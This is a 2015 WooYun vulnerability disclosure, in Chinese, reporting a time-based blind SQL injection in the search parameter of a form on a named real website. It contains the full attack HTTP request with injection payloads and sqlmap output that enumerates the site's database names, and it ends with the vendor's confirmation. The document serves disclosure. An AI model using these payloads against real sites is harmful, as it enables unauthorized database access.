wybug_detail:
漏洞详情 披露状态：   									2015-07-02：	细节已通知厂商并且等待厂商处理中									2015-07-02：	厂商已经确认，细节仅向厂商公开									2015-07-12：	细节向核心白帽子及相关领域专家公开									2015-07-22：	细节向普通白帽子公开									2015-08-01：	细节向实习白帽子公开									2015-08-16：	细节向公众公开  简要描述： 其实····提交你们厂商的漏洞很没有意思 一个注入才5分  到手的才2分 为了道义 还是发出来吧  不说了  评分最多也只是 中 5 详细说明：  POST数据包：
POST /baike/nbnc/sub/search_sub.php HTTP/1.1Content-Length: 338Content-Type: multipart/form-data; boundary=-----AcunetixBoundary_ARFKKNOLURX-Requested-With: XMLHttpRequestReferer: http://www.ci123.com:80/Host: www.ci123.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*Content-Type: multipart/form-data; boundary=-----AcunetixBoundary_CUMLGGTJEI-------AcunetixBoundary_CUMLGGTJEIContent-Disposition: form-data; name="submit"############-------AcunetixBoundary_CUMLGGTJEIContent-Disposition: form-data; name="search"if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/-------AcunetixBoundary_CUMLGGTJEI--
参数 search 处 可注入

   漏洞证明：  
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 106 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: -------AcunetixBoundary_CUMLGGTJEIContent-Disposition: form-data; name="submit"############-------AcunetixBoundary_CUMLGGTJEIContent-Disposition: form-data; name="search"if(now()=sysdate(),sleep(0),0)/' AND (SELECT * FROM (SELECT(SLEEP(5)))oTsc) AND'fFMD'='fFMD'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"/-------AcunetixBoundary_CUMLGGTJEI-----[00:51:16] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[00:51:16] [INFO] fetching database names[00:51:16] [INFO] fetching number of databases[00:51:16] [INFO] retrieved:[00:51:16] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y2[00:51:48] [INFO] retrieved:[00:51:53] [INFO] adjusting time delay to 2 seconds due to good response timesinformation_schema[00:54:35] [INFO] retrieved: baikeavailable databases [2]:[*] baike[*] information_schema[00:55:12] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.ci123.com'
   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-07-02 13:24 厂商回复： 感谢反馈！ 最新状态： 暂无
